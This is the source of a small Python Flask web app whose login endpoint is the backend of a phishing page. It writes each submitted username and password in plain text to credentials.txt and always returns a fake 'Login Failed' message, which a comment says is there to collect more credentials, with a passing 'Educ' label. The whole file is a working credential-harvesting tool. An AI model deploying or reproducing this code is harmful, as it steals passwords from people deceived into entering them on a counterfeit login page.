from flask import Flask, render_template, request, jsonify
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        username = data.get("loginuser")
        password = data.get("password")

        # ذخیره در فایل متنی
        with open("credentials.txt", "a", encoding="utf-8") as f:
            f.write(f"{username}:{password}\n")

        return jsonify({"message": "Login Failed Invalid Username or Password Try Again .. .!"}) # to get more Credentials Educ
    except Exception as e:
        return jsonify({"message": f"Error: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(debug=True)